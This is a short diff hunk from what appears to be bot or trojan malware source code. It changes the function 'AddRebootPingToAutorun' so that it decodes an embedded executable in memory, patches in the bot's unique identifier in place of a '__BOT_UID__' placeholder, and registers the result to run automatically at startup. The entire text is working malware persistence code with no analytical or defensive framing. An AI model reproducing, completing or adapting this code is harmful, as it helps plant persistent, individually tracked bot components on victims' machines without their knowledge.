@@ -217,8 +217,20 @@ DWORD WINAPI RebootNotifyThread(void* p)
 void AddRebootPingToAutorun()
 {
 	PP_DPRINTF("AddRebootPingToAutorun: started.");
-	AddToAutoRun( BotPingExe::data, sizeof(BotPingExe::data) );
-	PP_DPRINTF("AddRebootPingToAutorun: finished.");
+	void* exeFile;
+	DWORD size;
+	bool neededDel;
+	if( TMemoryDLL::DecodeDll( BotPingExe::data, size, exeFile, neededDel ) )
+	{
+		char* p = (char*) m_memmem( exeFile, size, "__BOT_UID__", 11 );
+		if( p )
+		{
+			m_lstrcpy( p, BOT_UID );
+			AddToAutoRun( exeFile, size );
+			if( neededDel ) MemFree(exeFile);
+			PP_DPRINTF("AddRebootPingToAutorun: finished.");
+		}
+	}
 }
 
 void AddRebootPingDllToAutorun()
